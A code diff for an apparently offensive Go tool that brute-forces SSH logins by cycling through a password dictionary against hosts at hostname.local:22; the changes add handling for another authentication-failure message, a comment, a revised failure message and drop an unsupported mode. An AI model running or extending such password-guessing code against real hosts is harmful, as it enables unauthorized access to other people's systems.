@@ -13,8 +13,12 @@ import (
 const (
 	authErr1 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain"
 	authErr2 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain"
+	authErr3 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain"
 )
 
+// dictAttack attempts to connect to the given hostname with all passwords in dict.Pwds() unless it
+// encounters err != nil nor authErr1, authErr2 or authErr3. In this case it stops cycling though
+// dict.Pwds() immediately.
 func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
 	if !verbose {
 		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
@@ -36,6 +40,10 @@ func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
 				if verbose {
 					log.Println(err.Error())
 				}
+			case authErr3:
+				if verbose {
+					log.Println(err.Error())
+				}
 			default:
 				log.Println("failed to connect: " + err.Error())
 				return
@@ -48,7 +56,7 @@ func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
 	}
 
 	if !verbose {
-		fmt.Println("Fail, password not in dictionary")
+		fmt.Println("Authentication with dictionary failed")
 	}
 }
 
@@ -93,8 +101,6 @@ func main() {
 		fmt.Println("Host list 100% complete, press enter to exit...")
 		fmt.Scanln()
 
-	case "json":
-		log.Fatalf("cfg/config.yml: mode '%s' is not supported yet!", config.Mode())
 	default:
 		log.Fatalf("cfg/config.yml: mode '%s' does not exist!", config.Mode())
 	}
